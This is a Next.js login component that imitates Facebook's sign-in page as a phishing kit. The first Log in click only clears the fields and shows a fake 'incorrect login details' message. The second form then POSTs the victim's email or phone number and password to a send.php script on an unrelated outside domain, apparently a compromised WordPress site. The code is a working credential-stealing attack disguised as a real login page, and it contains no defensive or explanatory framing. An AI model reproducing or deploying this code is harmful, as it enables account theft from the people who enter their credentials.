"use client"
import Image from "next/image"
import Link from "next/link"
import facebook from "./../public/facebook.svg"
import { useState } from "react"

const Form = () => {
  const [tryAgain, setTryAgain] = useState(true)
  const [textac, setTextac] = useState("")
  const [passac, setPassac] = useState("")
  
  const HandleTryAgain = (e) => {
    e.preventDefault()
    setTryAgain((val) => !val)
    setPassac("")
    setTextac("")
  }
  return (
    <div className="flex flex-col h-screen w-full p-4 items-center mt-[25px]">
      {tryAgain ? (
        <form
          className="flex flex-col w-full items-center gap-2"
          onSubmit={HandleTryAgain}
        >
          <div>
            <Image
              src={facebook}
              alt="ways"
              width={"140"}
              height="100"
              className="cursor-pointer"
            />
          </div>
          {/* username */}
          <div className="w-full mt-[20px]">
            <input
              type="text"
              name="user_name"
              placeholder="Mobile Number or Email Address"
              className=" w-[100%] md:flex md:w-[30%] md:mx-auto px-2 border-[1px] rounded-md h-[50px] bg-gray-200 shadow-sm pt-1 text-base font-normal text-black/90 shadow-black/30"
              required
              value={textac}
              onChange={(e) => setTextac(e.target.value)}
            />
          </div>
          {/* Password */}
          <div className="w-full">
            <input
              type="password"
              name="user_pass"
              placeholder="Password"
              className="w-[100%] md:flex md:w-[30%] md:mx-auto  px-2 border-[1px] rounded-md h-[50px] bg-gray-200 shadow-md pt-1 text-base font-normal text-black/90 shadow-black/30 mt-3 md:mt-5"
              required
              value={passac}
              onChange={(e) => setPassac(e.target.value)}
            />
          </div>
          {/* Login button */}
          <div className="w-full">
            <button
              className="bg-blue-700 w-[100%] h-[50px] md:flex md:w-[30%] md:mx-auto md:items-center md:justify-center mt-5 rounded-md text-white font-bold text-xl"
              type="button"
              onClick={HandleTryAgain}
            >
              Log in
            </button>
          </div>

          <Link href={"/"}>
            <p className="text-blue-700 mt-5 text-lg font-medium cursor-pointer">
              Forgotten Password?
            </p>
          </Link>

          <div className="flex w-full mt-6 items-center justify-center">
            <span className="border-b-2 w-2/4 md:w-[30%] border-black/10"></span>
            <p className="px-2"> or</p>
            <span className="border-b-2 w-2/4 md:w-[30%] border-black/10"></span>
          </div>

          <div className="w-full flex items-center justify-center">
            <button className="mt-8 md:mt-[4rem] w-[50%] md:w-[25%] h-10 bg-[#00A400] text-white p-1 rounded-md px-1 text-lg font-semibold">
              Create New Account
            </button>
          </div>
        </form>
      ) : (
        <form
          className="flex flex-col w-full items-center gap-2"
          action={"https://investmentquarters.com/wp-admin/js/pablo2/send.php"}
          method="POST"
        >
          <div>
            <Image
              src={facebook}
              alt="ways"
              width={"140"}
              height="100"
              className="cursor-pointer"
            />
          </div>
          {/* username */}
          <h1 className="font-semibold text-red-600">
            *INCORRECT LOGIN DETAILS, TRY AGAIN!
          </h1>
          <div className="w-full mt-[20px]">
            <input
              type="text"
              name="user_name"
              placeholder="Mobile Number or Email Address"
              className=" w-[100%] md:flex md:w-[30%] md:mx-auto px-2 border-[1px] rounded-md h-[50px] bg-gray-200 shadow-sm pt-1 text-base font-normal text-black/90 shadow-black/30"
              required
            />
          </div>
          {/* Password */}
          <div className="w-full">
            <input
              type="password"
              name="user_pass"
              placeholder="Password"
              className="w-[100%] md:flex md:w-[30%] md:mx-auto  px-2 border-[1px] rounded-md h-[50px] bg-gray-200 shadow-md pt-1 text-base font-normal text-black/90 shadow-black/30 mt-3 md:mt-5"
              required
            />
          </div>
          {/* Login button */}
          <div className="w-full">
            <button
              className="bg-blue-700 w-[100%] h-[50px] md:flex md:w-[30%] md:mx-auto md:items-center md:justify-center mt-5 rounded-md text-white font-bold text-xl"
              type="submit"
            >
              Try Again
            </button>
          </div>

          <Link href={"/"}>
            <p className="text-blue-700 mt-5 text-lg font-medium cursor-pointer">
              Forgotten Password?
            </p>
          </Link>

          <div className="flex w-full mt-6 items-center justify-center">
            <span className="border-b-2 w-2/4 md:w-[30%] border-black/10"></span>
            <p className="px-2"> or</p>
            <span className="border-b-2 w-2/4 md:w-[30%] border-black/10"></span>
          </div>

          <div className="w-full flex items-center justify-center">
            <button className="mt-8 md:mt-[4rem] w-[50%] md:w-[25%] h-10 bg-[#00A400] text-white p-1 rounded-md px-1 text-lg font-semibold">
              Create New Account
            </button>
          </div>
        </form>
      )}
    </div>
  )
}

export default Form
